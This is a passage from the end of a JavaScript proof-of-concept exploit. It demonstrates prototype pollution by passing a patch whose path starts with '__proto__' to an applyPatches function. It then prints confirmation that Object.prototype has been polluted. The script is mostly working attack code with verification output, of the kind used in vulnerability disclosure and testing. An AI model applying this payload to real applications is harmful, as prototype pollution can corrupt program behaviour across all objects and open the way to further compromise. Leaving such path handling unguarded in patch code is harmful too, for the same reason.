   // 3. By targeting '__proto__' as the first path segment, subsequent writes (like 'exploited') are applied 
   //    directly to the prototype chain rather than the target object, successfully polluting it.
   applyPatches({}, [
     { op: 'add', path: ['__proto__', 'exploited'], value: true }
   ]);

   console.log('[+] Post-condition verification: "exploited" in Object.prototype =>', 'exploited' in Object.prototype);

   if ('exploited' in Object.prototype) {
     console.log('[-] Vulnerability confirmed. Prototype pollution achieved across all objects.');
   }
}
await exploit();
